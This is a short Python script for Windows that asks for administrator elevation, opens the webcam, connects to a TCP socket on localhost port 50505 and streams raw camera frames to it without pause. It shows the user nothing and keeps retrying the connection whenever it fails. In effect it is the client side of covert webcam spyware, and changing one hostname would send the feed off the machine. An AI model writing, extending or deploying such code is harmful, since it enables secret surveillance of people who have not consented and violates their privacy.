import os
import unicodedata
import shutil
from shutil import copyfile
import sys
import win32com.shell.shell as shell
import socket
import time
from time import sleep
import getpass
import cv2
ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)

    
    vc = cv2.VideoCapture(0)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    def connect():
        try:
            
            sock.connect(('localhost', 50505))
            
            

            if vc.isOpened(): # try to get the first frame
                rval, frame = vc.read()
            else:
                rval = False

            while rval:
                rval, frame = vc.read()
                sock.sendall(frame)
                
        except:
            sleep(2)
            connect()

    connect()